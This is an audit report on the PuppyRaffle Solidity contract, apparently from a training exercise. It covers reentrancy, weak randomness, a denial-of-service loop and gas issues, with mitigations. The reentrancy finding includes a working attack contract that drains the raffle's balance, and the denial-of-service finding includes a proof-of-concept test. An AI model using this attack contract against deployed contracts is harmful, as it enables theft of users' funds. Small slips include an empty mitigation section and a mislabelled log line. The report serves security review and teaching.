### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain all funds
**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PupplyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. User enters the rafle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle:refund` from their attack contract, draining the contract balance.

**Proof of Code:**
<details>
<summary> POC </summary>


Place the following in to the `PuppyRaffleTest.t.sol`
```javascript
    function testReentrancy() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttack reentrancyAttack = new ReentrancyAttack(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        
        uint256 balanceAttackContractBefore = address(reentrancyAttack).balance;
        uint256 balanceContractBefore = address(puppyRaffle).balance;
        
        vm.prank(attacker);
        reentrancyAttack.attack{value: 1 ether}();
        
        uint256 balanceContractAfter = address(puppyRaffle).balance;
        uint256 balanceAttackContractAfter = address(reentrancyAttack).balance;
        
        console.log("balanceContractBefore", balanceContractBefore);
        console.log("balanceAttackContractBefore", balanceAttackContractBefore);
        console.log("================================================");
        console.log("balanceContractAfter", balanceContractAfter);
        console.log("balanceAttackContractAfter", balanceAttackContractAfter);
    }
```

And this contract as well

```javascript
contract ReentrancyAttack {        
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 indexOfAttacker;

    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable{
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        indexOfAttacker = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(indexOfAttacker);
    }

    function _stealMoney() internal {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(indexOfAttacker);
        }
    }

    fallback() external payable {
        _stealMoney();
    }
    
    receive() external payable {
        _stealMoney();
    }
}
```

</details>


**Recommended mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```
### [H-2] Weak Randomness in `PuppyRaffle:selectWinner` allows users to predict or influence the winner and influence or predict the winning puppy.

**Description:** Hashing `msg.sender`,`block.timestamp`, and `block.dificulty` together creates a predictable number. A predictable number is not a good random number. Malicious users can manipulate these variables or know them ahead of time to the winner of the raffle themselves.

*Note:* This additionally means users can front-run this function and call `refund` if they see they are not the winner.

**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. Making the entire raffle worthless if it becomes a gas war as to who wins the raffle.

**Proof of Concept:** 

1. Validators can know ahead of time the `block.timestamp`, and `block.dificulty` and use that to predict when to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.dificulty`was recently replaced with prevrandao.
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner.
3. Users can revert their `selectWinner` transaction if they don't like the winner or the resulting puppy. 

Using on-chain values as a randomness seed is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended mitigation:**

# Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing players at index 0 to think incorrectly they have not entered the raffle

**Description:** If a player is in the `PuppyRaffle::players`array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```javascript
    /// @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not enter the raffle correclty due to the function documentation

**Recommended mitigation:** The easiest recommendations is to revert if the player is not in the array instead of returning 0.

You could also reserve the 0th array position for any competition, but a better solution might be to return an `int256` where the function returns -1 if the player is not active. 


# Gas
### [G-1] Unchanged variables should be declared constant or immutable.

Reading from storage is much more expensive than reading from a constant or immutable variable.

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable|`
- `PuppyRaffle::commonImageUri` should be `constant`|
- `PuppyRaffle::rareImageUri` should be `constant`|
- `PuppyRaffle::legendaryImageUri` should be `constant`|

### [G-2] Storage variables in a loop should be cached

Everytime you call `player.length` you read from storage, as opposed to memory which is more gas efficient.

```diff
+       uint256 playerLength = player.length;
-       for (uint256 i = 0; i < players.length - 1; i++) {
+       for (uint256 i = 0; i < playersLength - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < playersLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```
### [G-3] Function only used out of contract should be External

In Solidity, the difference between public and external visibility for functions lies in how they handle parameters: public functions create a copy of array parameters in memory while external functions can read array parameters directly from calldata

To avoid the unnecessary memory copy of the `PuppyRaffle::newPlayers` array, change visibility of the function `PuppyRaffle::enterRaffle` to external instead of public:

```diff
-   function enterRaffle(address[] memory newPlayers) public payable {
+   function enterRaffle(address[] calldata newPlayers) external payable {
```

Similar situation with the function `PuppyRaffle::refund` but less gas saving since it is a uint256 not an array


### [I-1] Unspecific Solidity Pragma

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)



### [I-2] Using an outdated version of Solidity is not recommended.

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**:
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information


### [I-3] Address State Variable Set Without Checks

Check for `address(0)` when assigning values to address state variables.

- Found in src/PuppyRaffle.sol [Line: 67](src/PuppyRaffle.sol#L67)
- Found in src/PuppyRaffle.sol [Line: 208](src/PuppyRaffle.sol#L208)

</details>


### [I-4] EntranceFee should be greater than zero

If `PuppyRaffle:_entranceFee` is zero it could impact the finance core of the application since everyone could enter for free. This error requires admin error when deploying the contract, that is why it is only considered Informational.

- Found in src/PuppyRaffle.sol [Line: 63](src/PuppyRaffle.sol#L63)

**Recommendation**:
Add input validation for the constructor variables:

```diff
    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
+       require(_entranceFee > 0, "_entranceFee should be greater than zero");
        entranceFee = _entranceFee;

```

### [I-5] `PuppyRaffle::selectWinner` does not follow CEI, which is not  best practice

It is best to keep code clean and follow CEI (Check, Effects, Interactions)

```diff
-       (bool success,) = winner.call{value: prizePool}("");
-       require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+       (bool success,) = winner.call{value: prizePool}("");
+       require(success, "PuppyRaffle: Failed to send prize pool to winner");

```

### [S-1] Quadratic Complexity in enterRaffle() Function Enables DoS Attack

**Description:**  
The `enterRaffle()` function contains a nested loop for duplicate player checking that has O(n²) time complexity. The function first adds all new players to the array and then checks for duplicates by comparing each player against every other player in the array. This implementation causes gas costs to grow quadratically with the number of players.

Root cause in `PuppyRaffle.sol`:
```javascript
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    // First loop - O(n)
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Second nested loop - O(n²)
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

**Impact:**  
- Gas costs grow quadratically with the number of players, making the function increasingly expensive to call
- The contract becomes progressively more expensive to use as more players enter
- Could eventually make the contract unusable if gas costs exceed block gas limits
- Malicious actors could intentionally increase the players array to make the contract unusable
- Legitimate users could be priced out of participating in the raffle

**Proof of Concept:**  
<details>
<summary>POC</summary>

```javascript
function test_DoSAttack() public {
    vm.txGasPrice(1);
    uint256 numPlayers = 100;
    address[] memory players = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        players[i] = address(i);
    }

    uint256 gasBefore = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
    uint256 gasAfter = gasleft();
    console.log("Gas used with the first 100: ", (gasBefore - gasAfter) * tx.gasprice);

    address[] memory players2 = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        players2[i] = address(numPlayers + i);
    }
    
    uint256 gasBefore2 = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players2);
    uint256 gasAfter2 = gasleft();
    console.log("Gas used with the next 200: ", (gasBefore2 - gasAfter2) * tx.gasprice);
}
```
</details>

Test Results:
```javascript
[PASS] test_DoSAttack() (gas: 25537704)
Logs:
  Gas before 1073702769
  Gas after 1067199497
  Gas used with the first 100:  6503272
  Gas used with the next 200:  18995517
```

The test demonstrates:
- First 100 players consume 6,503,272 gas
- Next 100 players consume 18,995,517 gas
- ~2.92x increase in gas cost for the same number of players
- Clear evidence of quadratic growth in gas costs

**Recommended Mitigation:** 
1. Consider avoiding the check for duplicates. A user can create several wallets and then duplicates would not avoid the same person to participate several times.
   
2. Consider using mapping to replace the nested loop with a more efficient duplicate checking mechanism:
```javascript
contract PuppyRaffle {
    mapping(address => bool) public isPlayer;
    
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        
        for (uint256 i = 0; i < newPlayers.length; i++) {
            require(!isPlayer[newPlayers[i]], "PuppyRaffle: Duplicate player");
            isPlayer[newPlayers[i]] = true;
            players.push(newPlayers[i]);
        }
        
        emit RaffleEnter(newPlayers);
    }
}
```

1. Implement additional safeguards:
   - Add a maximum cap on the total number of players
   - Consider breaking large raffles into smaller ones
   - Add a maximum batch size for enterRaffle calls

These changes would reduce the time complexity from O(n²) to O(n) and prevent potential DoS attacks.

**Severity: Medium**
- Impact: High - The contract can become completely unusable due to gas limits, effectively blocking all users from participating
- Likelihood: Medium - While the attack is straightforward to execute, it requires a significant number of transactions and gas costs to reach a state where the contract becomes unusable
- Overall: Medium - Although the impact is high, the cost to execute and gradual nature of the attack gives users and owners time to react. No direct loss of funds occurs, but the contract's core functionality can be disrupted.